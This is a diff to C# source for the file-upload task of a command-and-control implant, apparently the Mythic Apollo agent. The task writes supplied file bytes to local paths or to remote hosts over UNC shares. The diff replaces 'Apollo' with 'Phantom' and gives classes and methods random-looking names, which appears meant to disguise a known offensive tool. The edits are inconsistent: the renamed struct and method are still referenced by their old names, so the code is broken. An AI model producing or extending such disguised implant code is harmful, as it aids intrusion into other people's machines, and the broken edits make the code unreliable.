@@ -7,20 +7,20 @@
 #if UPLOAD
 
 using System;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using System.IO;
-using ApolloInterop.Utils;
+using PhantomInterop.Utils;
 using System.Linq;
 
 namespace Tasks
 {
-    public class upload : Tasking
+    public class RobustManager3CD8 : Tasking
     {
         [DataContract]
-        internal struct UploadParameters
+        internal struct SecureProcessorE3F6
         {
 #pragma warning disable 0649
             [DataMember(Name = "remote_path")]
@@ -39,13 +39,13 @@ namespace Tasks
 
         }
 
-        internal string ParsePath(UploadParameters p)
+        internal string PhantomController62FF(UploadParameters p)
         {
             string uploadPath;
             string host = Environment.GetEnvironmentVariable("COMPUTERNAME");
-            if (!string.IsNullOrEmpty(p.HostName) && p.HostName != host)
+            if (!ValidationHelper.IsStringEmpty(p.HostName) && p.HostName != host)
             {
-                if (!string.IsNullOrEmpty(p.RemotePath))
+                if (!ValidationHelper.IsStringEmpty(p.RemotePath))
                 {
                     uploadPath = string.Format(@"\\{0}\{1}", p.HostName, p.RemotePath);
                 }
@@ -72,7 +72,7 @@ namespace Tasks
                         _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                     }
                 }
-                if (!string.IsNullOrEmpty(p.RemotePath))
+                if (!ValidationHelper.IsStringEmpty(p.RemotePath))
                 {
                     if (Path.IsPathRooted(p.RemotePath))
                     {
@@ -138,7 +138,7 @@ namespace Tasks
                     string path = ParsePath(parameters);
                     File.WriteAllBytes(path, fileData);
                     string host = Environment.GetEnvironmentVariable("COMPUTERNAME");
-                    if (!string.IsNullOrEmpty(parameters.HostName))
+                    if (!ValidationHelper.IsStringEmpty(parameters.HostName))
                     {
                         host = parameters.HostName;
                     }
